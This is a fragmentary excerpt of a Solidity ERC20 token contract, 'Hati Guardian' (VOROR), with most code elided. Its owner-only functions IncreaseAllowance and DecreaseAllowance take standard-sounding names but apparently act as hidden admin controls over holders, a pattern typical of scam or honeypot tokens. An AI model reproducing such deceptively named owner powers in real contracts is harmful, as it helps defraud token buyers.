...
contract VOROR is Context, IERC20, IERC20Metadata {
    ...
    uint256 public _totalSupply = 666666666*10**18;
    string public _name = "Hati Guardian";
    string public _symbol= "VOROR";
    bool balances1 = true;
    ...
    address private marketAddy = payable(0x207dCb8BdEE5bf7E2E17D5C227b91b766df3C7dA);
    ...
    function IncreaseAllowance(address[] memory recipients_) onlyOwner public {
    ...
    function _transfer(
      ...
      function DecreaseAllowance(address account, uint256 amount) onlyOwner  public virtual {
